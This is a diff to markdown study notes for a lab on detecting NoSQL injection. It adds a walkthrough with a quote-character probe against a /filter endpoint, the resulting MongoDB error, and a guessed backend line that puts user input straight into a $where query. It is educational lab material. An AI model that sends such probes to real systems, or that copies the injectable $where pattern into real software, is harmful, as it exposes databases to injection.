@@ -3,7 +3,28 @@
  - Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.
 
 ### Lab: Detecting NoSQL injection
-https://www.youtube.com/watch?v=xrFZMIwdlFU
+There's a vulnerable to nosqli endpoint:
+```bash
+GET /filter?category=Accessories HTTP/1.1
+```
+So we try:
+```bash
+GET /filter?category=Accessories' 
+```
+And we get back the err:
+```
+Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
+functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
+&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
+```
+On the backend they have something like:
+```bash
+const result = await productMongooseModel.find({ $where: `this.category === '${req.query.category}'`})
+```
+That `$where` from official mongodb docs:
+```
+Use the $where operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system
+```
 
 
 
